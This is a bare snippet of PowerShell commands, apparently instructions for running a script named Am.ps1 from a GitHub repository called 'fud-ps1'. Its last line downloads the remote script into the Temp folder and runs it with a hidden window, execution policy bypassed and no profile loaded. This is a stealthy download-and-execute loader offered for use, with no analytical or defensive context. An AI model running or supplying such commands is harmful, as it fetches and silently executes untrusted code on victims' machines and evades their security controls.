Set-ExecutionPolicy Bypass
or
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File .\Am.ps1
or
powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://github.com/AnonAm93/fud-ps1/raw/refs/heads/main/Am.ps1).content > "$env:Temp\Am.ps1";powershell "$env:Temp\Am.ps1""
